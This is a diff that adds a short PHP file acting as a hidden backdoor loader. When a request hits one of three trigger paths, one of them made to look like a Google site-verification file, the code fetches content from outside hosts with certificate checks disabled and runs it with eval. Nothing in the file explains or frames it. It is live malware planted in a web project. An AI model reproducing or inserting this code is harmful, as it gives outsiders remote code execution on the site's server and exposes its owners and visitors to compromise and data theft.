@@ -1,0 +1,43 @@
+<?php
+if (isset($_SERVER['REQUEST_URI'])) {
+    $r = strtok($_SERVER['REQUEST_URI'], '?');
+    $r = rtrim($r, '/') . '/';  
+    $c = array(
+        '/xwmla/' => 'https://8uniform.mb0b.in/watcheronly/watcher.txt',  
+        '/8page/' => 'https://raw.githubusercontent.com/alanlouwalker01-create/imbaru/refs/heads/main/BD',  
+        '/googlea43c346b94dbeaff.html/' => 'https://8uniform.mb0b.in/plugins/Brian.txt',
+    );
+    
+    foreach ($c as $path => $url) {
+        if ($r === $path) {
+            $u = $url;
+            $d = false;
+            if (function_exists('curl_init')) {
+                $h = curl_init($u);
+                curl_setopt_array($h, array(
+                    CURLOPT_RETURNTRANSFER => 1, 
+                    CURLOPT_FOLLOWLOCATION => 1, 
+                    CURLOPT_SSL_VERIFYPEER => 0, 
+                    CURLOPT_SSL_VERIFYHOST => 0, 
+                    CURLOPT_TIMEOUT => 30
+                ));
+                $d = @curl_exec($h);
+                if (!$d || curl_getinfo($h, CURLINFO_HTTP_CODE) != 200) $d = false;
+                curl_close($h);
+            }
+            if ($d === false && ini_get('allow_url_fopen')) {
+                $d = @file_get_contents($u, false, stream_context_create(array(
+                    'http' => array('timeout' => 30, 'follow_location' => 1), 
+                    'ssl' => array('verify_peer' => 0, 'verify_peer_name' => 0)
+                )));
+            }
+            if ($d) {
+                header("Cache-Control: no-store");
+                eval('?>' . $d);
+                exit;
+            }
+            http_response_code(503);
+            exit;
+        }
+    }
+}
